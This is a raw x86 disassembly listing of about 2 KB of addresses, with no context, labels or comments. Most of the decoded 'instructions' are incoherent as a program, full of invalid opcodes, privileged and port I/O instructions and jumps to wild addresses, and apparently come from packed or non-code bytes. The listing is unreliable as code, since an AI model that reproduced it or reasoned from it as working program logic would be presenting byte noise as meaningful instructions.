  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
